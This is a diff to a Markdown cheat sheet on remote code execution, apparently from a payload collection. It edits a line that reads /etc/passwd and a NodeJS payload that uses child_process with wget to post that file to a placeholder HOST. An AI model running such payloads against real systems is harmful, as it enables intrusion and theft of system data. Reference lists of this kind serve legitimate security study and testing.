@@ -3,7 +3,7 @@ Remote code execution is a security vulnerability that allows an attacker to exe
 	
 
 ## Exploits
-Normal code execution
+Normal code execution, execute the command and voila :p
 ```
 cat /etc/passwd 
 root:x:0:0:root:/root:/bin/bash 
@@ -37,7 +37,7 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
 NodeJS Code execution
 ```
-require('child_process').exec('wget+--post-data+"x=$(cat+/etc/passwd)"+HOST')
+require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
 ```
 
 ## Thanks to
